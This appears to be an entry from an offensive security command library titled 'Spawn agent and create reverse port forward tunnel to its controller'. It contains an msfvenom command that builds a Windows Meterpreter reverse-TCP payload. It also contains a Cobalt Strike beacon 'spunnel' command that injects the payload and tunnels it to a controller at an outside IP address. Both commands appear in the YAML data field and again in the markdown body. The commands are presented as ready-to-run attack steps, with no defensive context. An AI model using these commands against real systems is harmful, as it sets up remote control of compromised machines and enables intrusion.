---
id: 45188888-e4a4-492a-9c3b-41b007287dc2
name: Spawn agent and create reverse port forward tunnel to its controller
type: command
executor: bash
data: 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444
  -f raw -o /tmp/msf.bin

  beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin'
output: null
created_at: '2023-04-06T03:56:16.576446+00:00'
updated_at: '2023-04-10T20:36:22.875975+00:00'
---

# Spawn agent and create reverse port forward tunnel to its controller

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
```
